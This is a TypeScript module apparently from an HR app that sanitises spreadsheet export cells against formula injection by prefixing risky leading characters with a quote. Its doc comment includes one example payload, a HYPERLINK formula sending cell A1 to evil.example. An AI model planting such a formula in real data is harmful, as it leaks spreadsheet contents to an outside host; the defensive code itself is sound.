/**
 * Spreadsheet cell sanitisation.
 *
 * Excel (and LibreOffice, and Google Sheets) treat a cell whose text begins
 * with `=`, `+`, `-`, `@`, a tab or a carriage return as a FORMULA. Every
 * export in this app writes user-controlled values - employee names, emails,
 * codes, supervisor names, leave reasons, audit details, segment names -
 * straight into cells, so an employee record whose name is
 *
 *     =HYPERLINK("https://evil.example/?"&A1,"payroll")
 *
 * executes in the spreadsheet of whoever opens the export. Bulk Excel import
 * is precisely the path that would introduce such a value.
 *
 * Prefixing with a single quote makes the spreadsheet treat the value as
 * literal text. The quote is not shown to the reader.
 */
export function sanitizeCell<T>(value: T): T | string {
  if (typeof value !== 'string') return value;
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

/** Applies sanitizeCell to every value of every row of an export. */
export function sanitizeRows<T extends Record<string, any>>(rows: T[]): Record<string, any>[] {
  return rows.map((row) => {
    const out: Record<string, any> = {};
    for (const [key, value] of Object.entries(row)) out[key] = sanitizeCell(value);
    return out;
  });
}

/** Same, for the array-of-arrays form used by the schedule report. */
export function sanitizeAoa(rows: any[][]): any[][] {
  return rows.map((row) => row.map((cell) => sanitizeCell(cell)));
}
